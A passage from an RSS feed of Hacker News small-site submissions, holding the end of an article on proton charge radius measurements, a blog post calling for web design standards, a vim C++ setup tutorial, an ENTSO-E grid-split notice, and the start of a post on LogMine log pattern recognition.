</div><p>Over the past few years, various teams have been attempting to get to the bottom of the matter by looking at different orbital transitions in atomic hydrogen that are sensitive to different combinations of the Rydberg constant and the charge radius. A 2019 <a href="https://science.sciencemag.org/content/365/6457/1007" target="_blank">measurement</a> by a group of researchers at York University in Canada looked at a particular orbital transition that was independent of the value of this constant, finding a value of 0.833 ± 0.010 femtometers, consistent with the smaller value obtained in muonic hydrogen.&nbsp;</p><p>Grinin’s team went a step further. They used a technique known as frequency comb spectroscopy. It involves pulses of laser light that are a superposition of equally spaced frequencies—a ruler in frequency space if you will—that allowed them to look at two different orbital transitions in atomic hydrogen sensitive to two different combinations of the proton size and the Rydberg constant. This permitted them to determine both with unprecedented accuracy. The technique reduced, to only about one part in ten trillion, the observational uncertainties in the frequency of light these transitions emitted—a staggering degree of accuracy by any standard.&nbsp;</p><p>Not only did Grinin’s team find a value for the charge radius of the proton consistent with the value obtained in muonic hydrogen, they inferred a much more precise value for the Rydberg constant. This accounted for some part of the discrepancy seen in other measurements in atomic hydrogen (which presumed a less accurate value).</p><p>It thus appears that the experimental value of the proton charge radius Grinin’s team obtained in atomic hydrogen is converging on the smaller values for the proton charge radius other researchers initially obtained in muonic hydrogen. The smaller value has by now even been adopted as the <a href="https://physics.nist.gov/cgi-bin/cuu/Value?rp" target="_blank">official value</a> on the National Institute of Standards and Technology <a href="https://www.nist.gov/programs-projects/codata-values-fundamental-physical-constants" target="_blank">CODATA</a> list of recommended physical constants—the official almanac for nuclear and atomic chemists and physicists.&nbsp;</p><p>Although this convergence, based on the continued refinement of experimental techniques, did not deliver the new physics some may have been hoping for, even the most despondent theoretical physicist can acknowledge the experimental artistry that seems to be bringing the matter closer to conclusion. What remains unresolved is the reason why measurements, relying on different spectroscopic methods in atomic hydrogen, return different values for the charge radius of the proton. The mystery, and along with it, the diminishing hope of particle physicists, endures for the time being.&nbsp;</p><p>This was enough motivation for a team of theoretical physicists, led by Cliff Burgess at the Perimeter Institute, in Canada, to systematically catalogue all possible sources of theoretical uncertainty in atomic spectroscopy over a <a href="https://inspirehep.net/literature?sort=mostrecent&amp;size=25&amp;page=1&amp;q=find%20a%20burgess,%20c%20and%20a%20zalavari" target="_blank">series of papers</a>. By isolating the ways in which new forces and particles might leave a tell-tale signature, they’ve thrown the gauntlet firmly back to the experimentalists. Future experiments, as always, will be the ultimate arbiter in this matter.&nbsp;</p><p><i>Subodh Patil is an assistant professor at the Lorentz Institute for Theoretical Physics at Leiden University. He tweets on occasion at @_subodhpatil.</i></p>

		</div></div>]]>
            </description>
            <link>http://m.nautil.us/blog/a-breakthrough-in-measuring-the-building-blocks-of-nature</link>
            <guid isPermaLink="false">hacker-news-small-sites-25712475</guid>
            <pubDate>Sun, 10 Jan 2021 08:48:46 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Web Has No Design Standards]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 2 (<a href="https://news.ycombinator.com/item?id=25711575">thread link</a>) | @WoodenChair
<br/>
January 9, 2021 | http://www.observationalhazard.com/2021/01/the-web-has-no-design-standards.html | <a href="https://web.archive.org/web/*/http://www.observationalhazard.com/2021/01/the-web-has-no-design-standards.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="post-body-8752676873929759179">
<p>A reader recently complained to me about the hyperlinks on this blog. The reader thought the links were too hard to distinguish from the rest of the text. And the reader’s right. The Swedish Greys desktop theme that I thought looked cool eight years ago, while attractive in an aesthetic sense (to me at least), is not the most usable or accessible. I’ll be looking for another theme.</p>

<p>I was able to style my blog however I wanted to and it looks the same in all browsers. That’s the flexibility of good HTML/CSS standards. Every site can look and behave exactly as the creator envisioned. It’s also why the Web’s a usability nightmare. We have to learn to use every site we visit because every site is designed differently. How come when we talk about Web standards the focus is almost entirely on technical standards? Where is the worry about design standards?</p>

<p>I recently finished reading the classic book <em><a href="https://amzn.to/2JZgkSD">The Design of Everyday Things</a></em> by Don Norman and it talks about standards. Normans says “When all else fails, standardize.” Basically when you have no other way of implementing good design, you turn to standardization so at least every user only needs to learn how to use the similar things (in this case web pages) once. And I think we have no other way, because if we did, we would have figured it out in the past 30 years.</p>

<p>It wasn’t always this way. I remember using the pre-CSS and pre-JavaScript Web as a little kid on Mosaic. You knew there that the blue underlined text was always a hyperlink. And you knew that the back button always took you back a page. And you didn’t have to worry what different actions buttons did, because there was no JavaScript. I’m not saying we should go back there, but in many ways having the constraints made pages easier to use. There was no need to think. Now we have no constraints, but that’s why we need standards.</p>

<p>Every other major consumer computing platform but the Web has design standards. Apple’s platforms are famous for their Human Interface Guidelines. They are an attempt to ensure all apps follow some standard design conventions. Not every app does, but Apple has some ability to enforce them through its app stores, and some users even demand developers follow them. So, they are at least kinda sorta followed by most major apps. If the Web had design standards, maybe users would demand developers follow them too. Google and Microsoft have design suggestions and guidelines for their developers. This is why a good app for each platform feels “at home.”</p>

<p>But we have no design guidelines for the Web that are widely accepted. Sure, people have tried. But the only way we’re going to get something that’s actually followed is if we have a standard. And a standard needs to come from a standards body (Apple, Microsoft, and Google are the standards bodies for their respective platforms). W3C, please put some focus on a design standard. Not everybody will be forced to follow it, but it could do a lot of good in terms of usability.</p>


</div></div>]]>
            </description>
            <link>http://www.observationalhazard.com/2021/01/the-web-has-no-design-standards.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25711575</guid>
            <pubDate>Sun, 10 Jan 2021 06:47:48 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Using (neo)vim for C++ development]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 2 (<a href="https://news.ycombinator.com/item?id=25711091">thread link</a>) | @jubnzv
<br/>
January 9, 2021 | https://idie.ru/posts/vim-modern-cpp | <a href="https://web.archive.org/web/*/https://idie.ru/posts/vim-modern-cpp">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
  <main>
    <h2 id="background">Background</h2>
<p>I’ve been writing code in vim for the past several years, and in this post I’d like to share some tips on configuring a development environment. This post contains some notes on configuration that would have helped me when I first started using vim and working on my own config. I hope that as a result of reading this, you will be able to improve your workflow with some new features and make the development process easier and more convenient.</p>
<p>In this article, we will look at common tasks that occur when editing code and try to automate and improve them using vim. Each section contains a brief description of the problem, a proposed solution, overview of alternatives, a full code listing for the configuration, and a screenshot or animated screencast with a demonstration. At the end, additional links to useful plugins and resources will be provided.</p>
<p>Most of the tasks come down to installing and properly configuring one or more plugins. I assume that you are an experienced vim user and already use one of the plugin managers.</p>
<p>All of these tips are applicable in both vim and neovim. Also, despite the title, some of these tips can be applied not only to C++, but also to any other language.</p>
<h2 id="removing-trailing-whitespaces">Removing trailing whitespaces</h2>
<p>Let’s start with a very simple problem. Some code conventions restrict the leaving of trailing whitespaces. For example, the Linux Kernel <a href="https://www.kernel.org/doc/html/v4.10/process/coding-style.html#spaces">prohibits</a> from doing this.</p>
<p>So we’d like to see when we accidentally leave a space at the end of a line. Let’s add the following lines in your vim configuration file:</p>
<div><pre><code data-lang="vim"><span>highlight</span> <span>ExtraWhitespace</span> <span>ctermbg</span>=<span>red</span> <span>guibg</span>=<span>red</span><span>
</span><span></span><span>match</span> <span>ExtraWhitespace</span> <span>/\s\+$/</span><span>
</span><span></span><span>au</span> <span>BufWinEnter</span> * <span>match</span> <span>ExtraWhitespace</span> <span>/\s\+$/</span><span>
</span><span></span><span>au</span> <span>InsertEnter</span> * <span>match</span> <span>ExtraWhitespace</span> <span>/\s\+\%#\@&lt;!$/</span><span>
</span><span></span><span>au</span> <span>InsertLeave</span> * <span>match</span> <span>ExtraWhitespace</span> <span>/\s\+$/</span><span>
</span><span></span><span>au</span> <span>BufWinLeave</span> * <span>call</span> <span>clearmatches</span>()<span>
</span></code></pre></div><p>As a result, extra whitespaces will be highlighted as follows:</p>
<p><img src="https://idie.ru/static/posts/vim-modern-cpp/trailing-ws.png" alt=""></p>
<p>We also want to remove extra spaces by the single key binding. Let’s define it:</p>
<div><pre><code data-lang="vim"><span>" Remove all trailing whitespaces</span><span>
</span><span></span><span>nnoremap</span> &lt;<span>silent</span>&gt; &lt;<span>leader</span>&gt;<span>rs</span> :<span>let</span> <span>_s</span>=@<span>/ &lt;Bar&gt; :%s/</span>\<span>s</span>\+$<span>//</span><span>e</span> &lt;<span>Bar</span>&gt; :<span>let</span> @/=<span>_s</span> &lt;<span>Bar</span>&gt; :<span>nohl</span> &lt;<span>Bar</span>&gt; :<span>unlet</span> <span>_s</span> &lt;<span>CR</span>&gt;<span>
</span></code></pre></div><p>So we can solve this simple problem.</p>
<p>Alternatives:</p>
<ul>
<li>You <a href="https://www.reddit.com/r/vim/comments/82yv3p/anyone_know_how_to_get_the_dots_for_leading/dveznas?utm_source=share&amp;utm_medium=web2x&amp;context=3">can show</a> all whitespaces and line breaks in the source code.</li>
<li>There is <a href="https://editorconfig.org/">editorconfig</a> <a href="https://github.com/editorconfig/editorconfig-vim">plugin</a> for vim that supports the <code>trim_trailing_whitespace</code> option. When it is set to <code>true</code> the plugin will remove any whitespace characters preceding newline characters.</li>
<li>See <a href="##formatting-source-code-with-clang-format">clang-format</a> section below.</li>
</ul>
<h2 id="accessing-standard-library-documentation-using-cppman">Accessing Standard Library documentation using <code>cppman</code></h2>
<p>Vim ships with a man page viewer that works out of the box on any modern *nix via <a href="https://vimhelp.org/filetype.txt.html#ft-man-plugin">:Man</a> command. But the system man pages do not contain the definitions for C++. Let’s fix it by installing <a href="https://github.com/aitjcize/cppman">Cppman</a>.</p>
<p>Cppman is a set of C++ 98/11/14/17/20 manual pages for Linux, with source from <a href="https://cplusplus.com/">cplusplus.com</a> and <a href="https://cppreference.com/">cppreference.com</a>. You can easily install using <code>pip</code> or the package manager for your distribution according to their <a href="https://github.com/aitjcize/cppman#installation">Installation guide</a>. Next, let’s configure vim.</p>
<p>By default, when you press <code>K</code>, vim grabs the keyword under the cursor, separated by <a href="https://vimhelp.org/options.txt.html#%27iskeyword%27">iskeyword</a> symbols. There is one problem. The <code>:</code> symbol often found in C++ definitions is not included in the <code>iskeyword</code> array. So, for example, when you press <code>K</code> under the keyword <code>std::string</code>, vim will try to find the man page for <code>std</code>, instead of the full identifier. Let’s fix it with this small function:</p>
<div><pre><code data-lang="vim"><span>function</span>! <span>s</span>:<span>JbzCppMan</span>()<span>
</span><span></span>    <span>let</span> <span>old_isk</span> = &amp;<span>iskeyword</span><span>
</span><span></span>    <span>setl</span> <span>iskeyword</span>+=:<span>
</span><span></span>    <span>let</span> <span>str</span> = <span>expand</span>(<span>"&lt;cword&gt;"</span>)<span>
</span><span></span>    <span>let</span> &amp;<span>l</span>:<span>iskeyword</span> = <span>old_isk</span><span>
</span><span></span>    <span>execute</span> <span>'Man '</span> . <span>str</span><span>
</span><span></span><span>endfunction</span><span>
</span><span></span><span>command</span>! <span>JbzCppMan</span> :<span>call</span> <span>s</span>:<span>JbzCppMan</span>()<span>
</span></code></pre></div><p>We also need to remap the default <code>K</code> key binding to use our function in C++:</p>
<div><pre><code data-lang="vim"><span>au</span> <span>FileType</span> <span>cpp</span> <span>nnoremap</span> &lt;<span>buffer</span>&gt;<span>K</span> :<span>JbzCppMan</span>&lt;<span>CR</span>&gt;<span>
</span></code></pre></div><p>Here is a result:</p>
<p><img src="https://idie.ru/static/posts/vim-modern-cpp/cppman.png" alt=""></p>
<h2 id="browsing-online-documentation-from-vim">Browsing online documentation from vim</h2>
<p>But what if you also want to quickly access online documentation for your favorite library or framework? Or may be search for unknown keywords on StackOverflow, Google or similar sites? And it is desirable to make a solution that can be easily extended to support more search engines.</p>
<p><a href="https://github.com/tyru/open-browser.vim">open-browser.vim</a> can help us. This is a plugin that allows you open URLs in your favorite browser using vim.</p>
<p>Install it using your package manager. Then let’s add a simple configuration to access cppreference and Qt documentation pages:</p>
<div><pre><code data-lang="vim"><span>let</span> <span>g</span>:<span>openbrowser_search_engines</span> = <span>extend</span>(<span>
</span><span></span>\ <span>get</span>(<span>g</span>:, <span>'openbrowser_search_engines'</span>, {}),<span>
</span><span></span>\ {<span>
</span><span></span>\   <span>'cppreference'</span>: <span>'https://en.cppreference.com/mwiki/index.php?title=Special%3ASearch&amp;search={query}'</span>,<span>
</span><span></span>\   <span>'qt'</span>: <span>'https://doc.qt.io/qt-5/search-results.html?q={query}'</span>,<span>
</span><span></span>\ },<span>
</span><span></span>\ <span>'keep'</span><span>
</span><span></span>\)<span>
</span></code></pre></div><p>And add some convenient key bindings by this way:</p>
<div><pre><code data-lang="vim"><span>nnoremap</span> &lt;<span>silent</span>&gt; &lt;<span>leader</span>&gt;<span>osx</span> :<span>call</span> <span>openbrowser</span>#<span>smart_search</span>(<span>expand</span>(<span>'&lt;cword&gt;'</span>), <span>"cppreference"</span>)&lt;<span>CR</span>&gt;<span>
</span><span></span><span>nnoremap</span> &lt;<span>silent</span>&gt; &lt;<span>leader</span>&gt;<span>osq</span> :<span>call</span> <span>openbrowser</span>#<span>smart_search</span>(<span>expand</span>(<span>'&lt;cword&gt;'</span>), <span>"qt"</span>)&lt;<span>CR</span>&gt;<span>
</span></code></pre></div><p>As a result we can quickly browse online documentation for the word under the cursor:</p>
<p><img src="https://idie.ru/static/posts/vim-modern-cpp/openbrowser.gif" alt=""></p>
<p>Further use of this plugin is limited only by your imagination. For example, you can use it to search for similar C++ snippets in open source projects on GitHub:</p>
<div><pre><code data-lang="vim"><span>'github-cpp'</span>: <span>'http://github.com/search?l=C%2B%2B&amp;q=fork%3Afalse+language%3AC%2B%2B+{query}&amp;type=Code'</span>,<span>
</span></code></pre></div><p>Or integrate it with <a href="https://grep.app/">grep.app</a> or <a href="https://codesearch.debian.net/">Debian Code Search</a>. Or add integration with your favorite online translation service, if you work with multiple languages. You get the idea. The main thing is to write the configuration correctly.</p>
<p>Alternatives:</p>
<ul>
<li><a href="https://github.com/KabbAmine/zeavim.vim">zeavim.vim</a> is a plugin that implements the integration with <a href="https://zealdocs.org/">Zeal</a> – free and open source offline documentation browser. In fact, it solves the same problem. You may want to use it if you don’t have an internet connection, or you need access to documentation for a specific version of the framework that isn’t available online.</li>
<li><a href="https://github.com/rhysd/devdocs.vim">devdocs.vim</a> is a plugin for <a href="https://devdocs.io/">devdocs</a> which also provides multiple API documentations.</li>
</ul>
<h2 id="switching-between-source-and-header-file">Switching between source and header file</h2>
<p>Switching between source and header files is another common operation when working with C++.</p>
<p>After searching and trying many solutions, I settled on <a href="https://github.com/derekwyatt/vim-fswitch">vim-fswitch</a> plugin. Personally, I like this plugin for its simple configuration for various file types and the absence of third-party dependencies.</p>
<p>Install it with your favorite package manager. It will perfectly works out of the box, but sometimes you want to configure switch destination files like this:</p>
<div><pre><code data-lang="vim"><span>au</span> <span>BufEnter</span> *.<span>h</span>  <span>let</span> <span>b</span>:<span>fswitchdst</span> = <span>"c,cpp,cc,m"</span><span>
</span><span></span><span>au</span> <span>BufEnter</span> *.<span>cc</span> <span>let</span> <span>b</span>:<span>fswitchdst</span> = <span>"h,hpp"</span><span>
</span></code></pre></div><p>It also will be convenient to set up some key bindings:</p>
<div><pre><code data-lang="vim"><span>nnoremap</span> &lt;<span>silent</span>&gt; &lt;<span>A</span>-<span>o</span>&gt; :<span>FSHere</span>&lt;<span>cr</span>&gt;<span>
</span><span></span><span>" Extra hotkeys to open header/source in the split</span><span>
</span><span></span><span>nnoremap</span> &lt;<span>silent</span>&gt; &lt;<span>localleader</span>&gt;<span>oh</span> :<span>FSSplitLeft</span>&lt;<span>cr</span>&gt;<span>
</span><span></span><span>nnoremap</span> &lt;<span>silent</span>&gt; &lt;<span>localleader</span>&gt;<span>oj</span> :<span>FSSplitBelow</span>&lt;<span>cr</span>&gt;<span>
</span><span></span><span>nnoremap</span> &lt;<span>silent</span>&gt; &lt;<span>localleader</span>&gt;<span>ok</span> :<span>FSSplitAbove</span>&lt;<span>cr</span>&gt;<span>
</span><span></span><span>nnoremap</span> &lt;<span>silent</span>&gt; &lt;<span>localleader</span>&gt;<span>ol</span> :<span>FSSplitRight</span>&lt;<span>cr</span>&gt;<span>
</span></code></pre></div><p>Alternatives:</p>
<ul>
<li>There are many other options described in this <a href="https://vim.fandom.com/wiki/Easily_switch_between_source_and_header_file">vimwiki article</a>. You can try them or write your own solution.</li>
</ul>

<p><code>ctags</code> is a convenient indexing tool that allows you to go to symbol definition from your project using <code>tags</code> database. This is an old and reliable tool, that is <a href="https://kernelnewbies.org/FAQ/CodeBrowsing">recommended</a> <a href="https://stackoverflow.com/a/33682137/8541499">to use</a> for large code bases like Linux Kernel where other tools like LSP may get stuck.</p>
<p>The most actual and maintained implementation of ctags is <a href="https://github.com/universal-ctags/ctags">universal-ctags</a>. It is available in all popular distributions.</p>
<p>Vim has integrated ctags support. But here is one annoying thing. We need to generate <code>tags</code> database for each project using something like <code>ctags -R .</code>. Moreover, we need re-generate <code>tags</code> when editing the project.</p>
<p>This of course can be automated. Install <a href="https://github.com/ludovicchabant/vim-gutentags">vim-guttentags</a> is a plugin that will asynchronously (re)generate tag files as you work. I also suggest adding a simple configuration to avoid indexing of some unwanted files:</p>
<div><pre><code data-lang="vim"><span>set</span> <span>tags</span>=./<span>tags</span>;<span>
</span><span></span><span>let</span> <span>g</span>:<span>gutentags_ctags_exclude_wildignore</span> = <span>1</span><span>
</span><span></span><span>let</span> <span>g</span>:<span>gutentags_ctags_exclude</span> = [<span>
</span><span></span>  \<span>'node_modules'</span>, <span>'_build'</span>, <span>'build'</span>, <span>'CMakeFiles'</span>, <span>'.mypy_cache'</span>, <span>'venv'</span>,<span>
</span><span></span>  \<span>'*.md'</span>, <span>'*.tex'</span>, <span>'*.css'</span>, <span>'*.html'</span>, <span>'*.json'</span>, <span>'*.xml'</span>, <span>'*.xmls'</span>, <span>'*.ui'</span>]<span>
</span></code></pre></div><p>This makes your workflow simpler and more convenient. See also <a href="https://vim.fandom.com/wiki/Browsing_programs_with_tags">this</a> detailed vimwiki article if you need more information about using ctags.</p>
<h2 id="exploring-source-file-structure-with-vistavim">Exploring source file structure with <code>vista.vim</code></h2>
<p>When you are working with unfamiliar source code, it may be convenient to browse the structure of the current source file. What classes, functions, macroses are defined here?</p>
<p><a href="https://github.com/liuchengxu/vista.vim">vista.vim</a> is a plugin that helps us. It opens a split with the current file definitions. Here is what it looks like:</p>
<p><img src="https://idie.ru/static/posts/vim-modern-cpp/vista.png" alt=""></p>
<p>This plugin shows both LSP and ctags symbols. The LSP configuration is beyond the scope of this post, but it is a very useful feature that can give more accurate information.</p>
<p>To use it, install <a href="https://github.com/liuchengxu/vista.vim">vista.vim</a> with your favorite package manager and add a convenient key binding to toggle Vista split:</p>
<div><pre><code data-lang="vim"><span>nnoremap</span> &lt;<span>silent</span>&gt; &lt;<span>A</span><span>-6</span>&gt; :<span>Vista</span>!!&lt;<span>CR</span>&gt;<span>
</span></code></pre></div><p>Alternatives:</p>
<ul>
<li><a href="https://github.com/preservim/tagbar">tagbar</a> is another plugin that provides a way to get the overview of the file structure. Unlike vista.vim, it doesn’t support LSP symbols and doesn’t provide useful utility functions for retrieving the information about the symbol under the cursor. But it’s simpler and more reliable.</li>
</ul>
<h2 id="display-the-current-function-in-the-status-line">Display the current function in the status line</h2>
<p>Another feature of <a href="https://github.com/liuchengxu/vista.vim">vista.vim</a> is that it shares information of the symbol under the cursor. Using this we can display the current function name in the status line. This helps us navigate when moving through a large file.</p>
<p>Bellow is an example of configuration for the <a href="https://github.com/itchyny/lightline.vim">lightline</a>, but you can easily adapt it to your status bar:</p>
<div><pre><code data-lang="vim"><span>function</span>! <span>LightlineCurrentFunctionVista</span>() <span>abort</span><span>
</span><span></span>  <span>let</span> <span>l</span>:<span>method</span> = <span>get</span>(<span>b</span>:, <span>'vista_nearest_method_or_function'</span>, <span>''</span>)<span>
</span><span></span>  <span>if</span> <span>l</span>:<span>method</span> != <span>''</span><span>
</span><span></span>    <span>let</span> <span>l</span>:<span>method</span> = <span>'['</span> . <span>l</span>:<span>method</span> . <span>']'</span><span>
</span><span></span>  <span>endif</span><span>
</span><span></span>  <span>return</span> <span>l</span>:<span>method</span><span>
</span><span></span><span>endfunction</span><span>
</span><span></span><span>au</span> <span>VimEnter</span> * <span>call</span> <span>vista</span>#<span>RunForNearestMethodOrFunction</span>()<span>
</span></code></pre></div><p>Here’s what it looks like:</p>
<p><img src="https://idie.ru/static/posts/vim-modern-cpp/current-function.gif" alt=""></p>
<p>Is you need the complete lightline configuration, see <a href="https://github.com/jubnzv/dotfiles/blob/dd46c2d940c13a0db8d94b02934659018358579a/.config/nvim/init.vim#L435-L462">this snippet</a> and take a look at lightline documentation.</p>
<p>Alternatives:</p>
<ul>
<li>There are many alternatives provided by popular LSP plugins. For example, <a href="https://github.com/nvim-lua/lsp-status.nvim">lsp-status.nvim</a> can provide the same information for Neovim’s built-in LSP server.</li>
</ul>
<h2 id="vimspector-interactive-debugging-inside-vim">vimspector: Interactive …</h2></main></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://idie.ru/posts/vim-modern-cpp">https://idie.ru/posts/vim-modern-cpp</a></em></p>]]>
            </description>
            <link>https://idie.ru/posts/vim-modern-cpp</link>
            <guid isPermaLink="false">hacker-news-small-sites-25711091</guid>
            <pubDate>Sun, 10 Jan 2021 05:59:12 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[System split registered in the synchronous area of Continental Europe]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25711075">thread link</a>) | @nip
<br/>
January 9, 2021 | https://www.entsoe.eu/news/2021/01/08/system-split-registered-in-the-synchronous-area-of-continental-europe-incident-now-resolved | <a href="https://web.archive.org/web/*/https://www.entsoe.eu/news/2021/01/08/system-split-registered-in-the-synchronous-area-of-continental-europe-incident-now-resolved">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div><p>The synchronous area of Continental Europe was split into two separated grid regions between 14h05 CET and 15h08 CET when it was reconnected on 8 January 2021.</p><p>An area in the south east region of the interconnected grid was during that period separated from the rest of Continental Europe. A temporary frequency drop of approximately 250 mHz was registered. Coordinated actions and an immediate response taken by the Continental European Transmission System Operators ensured that the system stability was not affected in most European countries.</p><p>An investigation is ongoing on the cause of this system split and further information on this incident will be made in due course.</p><p>Should you have questions, send them at <a href="https://www.entsoe.eu/news/2021/01/08/media@entsoe.eu">media@entsoe.eu</a> or contact us at the following telephone number: +32 476 97 50 93.</p></div></div></div></div>]]>
            </description>
            <link>https://www.entsoe.eu/news/2021/01/08/system-split-registered-in-the-synchronous-area-of-continental-europe-incident-now-resolved</link>
            <guid isPermaLink="false">hacker-news-small-sites-25711075</guid>
            <pubDate>Sun, 10 Jan 2021 05:57:11 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Log Pattern Recognition: LogMine]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25710991">thread link</a>) | @trungdq88
<br/>
January 9, 2021 | https://sayr.us/log-pattern-recognition/logmine/ | <a href="https://web.archive.org/web/*/https://sayr.us/log-pattern-recognition/logmine/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div aria-label="Content">
      <div>
        <article itemscope="" itemtype="http://schema.org/BlogPosting">

  

  <div itemprop="articleBody">
    <p>When retrieving logs from an application, you are often looking for outliers
(such as a unique error) or what pattern occurs the most. However, defining
patterns manually is time-consuming and requires rigour across projects. In
this series of blog posts, we are going to explore automated Log Pattern
Recognition.</p>

<h2 id="why">Why</h2>

<p>I recently began using <a href="https://docs.datadoghq.com/logs/explorer/patterns/">Datadog Log Pattern</a>
and became addicted to it. Unfortunately, I was not able to find such a feature on
Kibana or a query proxy able to do this analysis. If that does not exist, I
might as well learn more about it and make one!</p>

<p>To my surprise, I did not find as many papers as I thought I would. And the
number of papers with public implementations is even lower. Our series begins
with a paper called <a href="https://www.cs.unm.edu/~mueen/Papers/LogMine.pdf">LogMine: Fast Pattern Recognition for Log Analytics</a>
and <a href="https://github.com/trungdq88/logmine">an implementation made by Tony Dinh</a>
that helped me a lot to study LogMine’s behavior.</p>

<p>To my surprise, I searched for anything related to LogMine on Hacker News
and only found Tony Dinh’s submission.</p>

<h2 id="defining-the-terms-used-in-this-article">Defining the terms used in this article</h2>

<p>Some terms used in this article can have several meanings. In Logmine’s context,
the terms I use mean:</p>
<ul>
  <li><code>log</code>: a log line (<code>string</code>)
    <div><div><pre><code>12:00:00 - My awesome log
</code></pre></div>    </div>
  </li>
  <li><code>pattern</code>: Expression extracted by the algorithm (array of <code>field</code>)
    <div><div><pre><code>[&lt;date&gt;, "-", "My", "awesome", "log"]
</code></pre></div>    </div>
  </li>
  <li><code>field</code>: Part of a <code>pattern</code> / Word from a <code>log</code> (Either a fixed value, a wildcard or a <code>variable</code>)</li>
  <li><code>cluster</code>: represents a group of logs that were identified as close to each
others</li>
  <li><code>variable</code>: a user-provided regex used to identify a known format
    <div><div><pre><code>number = \d+
time = \d{2}:\d{2}:\d{2}
</code></pre></div>    </div>
  </li>
</ul>

<h2 id="an-introduction-to-logmine">An introduction to LogMine</h2>

<p>The LogMine paper describes a method to parse logs, group them into clusters and
extract patterns without any prior knowledge or supervision. LogMine can be
implemented using MapReduce and works in a single pass over the dataset.</p>

<p>LogMine’s approach to grouping logs roughly works by:</p>
<ol>
  <li>Parsing logs into patterns</li>
  <li>Grouping patterns into clusters if the <a href="#clustering">distance</a> between them is small</li>
  <li>Merging clusters into a single pattern</li>
  <li>Repeat from step 2 until you are satisfied</li>
</ol>

<p>LogMine classifies fields into three categories:</p>
<ul>
  <li><code>Fixed value</code>, a field that is constant across all logs in a cluster. This is
detected at the pattern extraction step.</li>
  <li><code>Variable</code>, a field that matches a pattern provided by the user. This is
detected at the pre-processing step.</li>
  <li><code>Wildcard</code>, a field that is not constant across all logs in a cluster. This is
detected at the pattern extraction step.</li>
</ul>

<p>Let’s illustrate how it works, step by step, using three simple logs:</p>

<div><div><pre><code>10:00:00 - [DEBUG] - User 123 disconnected
10:30:00 - [DEBUG] - User 123 disconnected
11:11:11 - [ERROR] - An error occurred while disconnecting user 456
12:12:12 - [DEBUG] - User 789 disconnected
</code></pre></div></div>

<p>We will also define a variable <code>&lt;time&gt;</code> that follows the pattern
<code>\d{2}:\d{2}:\d{2}</code>.</p>

<div>
  <p><strong>Note</strong></p>

  <p>A good practice would be to define more variables to avoid forming two clusters
from logs with low similarity. For instance, we <strong>should</strong> define <code>&lt;number&gt;</code>
as <code>\d+</code>.</p>

  <p>Depending on the pattern of your logs, defining a common field like <code>&lt;log-level&gt;</code>
as <code>[(DEBUG|INFO|WARNING|ERROR)]</code> might end up hiding information. This is
because a <code>WARNING</code> log with an error message might not be that important yet
the same log message with an <code>ERROR</code> level might have the exact information
you would like to highlight.</p>
</div>

<h3 id="log-parsing-and-dense-clusters-identification">Log parsing and dense clusters identification</h3>

<p>The first step is to parse logs into patterns and identify dense clusters. Dense
clusters are clusters where <strong>raw logs are almost identical</strong>.</p>

<p>To do this, we begin by splitting logs into patterns (an array of field). The
separator used by default is any whitespace character.</p>

<table>
  <thead>
    <tr>
      <th><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>F</mi><mi>i</mi><mi>e</mi><mi>l</mi><msub><mi>d</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">Field_1</annotation></semantics></math></span></span></th>
      <th><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>F</mi><mi>i</mi><mi>e</mi><mi>l</mi><msub><mi>d</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">Field_2</annotation></semantics></math></span></span></th>
      <th><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>F</mi><mi>i</mi><mi>e</mi><mi>l</mi><msub><mi>d</mi><mn>3</mn></msub></mrow><annotation encoding="application/x-tex">Field_3</annotation></semantics></math></span></span></th>
      <th>&nbsp;</th>
      <th>&nbsp;</th>
      <th>&nbsp;</th>
      <th>&nbsp;</th>
      <th>&nbsp;</th>
      <th><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>F</mi><mi>i</mi><mi>e</mi><mi>l</mi><msub><mi>d</mi><mi>n</mi></msub></mrow><annotation encoding="application/x-tex">Field_n</annotation></semantics></math></span></span></th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>10:00:00</td>
      <td>-</td>
      <td>[DEBUG]</td>
      <td>-</td>
      <td>User</td>
      <td>123</td>
      <td>disconnected</td>
      <td>&nbsp;</td>
      <td>&nbsp;</td>
    </tr>
    <tr>
      <td>10:30:00</td>
      <td>-</td>
      <td>[DEBUG]</td>
      <td>-</td>
      <td>User</td>
      <td>123</td>
      <td>disconnected</td>
      <td>&nbsp;</td>
      <td>&nbsp;</td>
    </tr>
    <tr>
      <td>11:11:11</td>
      <td>-</td>
      <td>[ERROR]</td>
      <td>-</td>
      <td>An</td>
      <td>error</td>
      <td>occurred</td>
      <td>while</td>
      <td>…</td>
    </tr>
    <tr>
      <td>12:12:12</td>
      <td>-</td>
      <td>[DEBUG]</td>
      <td>-</td>
      <td>User</td>
      <td>789</td>
      <td>disconnected</td>
      <td>&nbsp;</td>
      <td>&nbsp;</td>
    </tr>
  </tbody>
</table>

<p>Next, we will tokenize the logs and identify variables (regex provided by the
user).</p>

<table>
  <thead>
    <tr>
      <th><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>F</mi><mi>i</mi><mi>e</mi><mi>l</mi><msub><mi>d</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">Field_1</annotation></semantics></math></span></span></th>
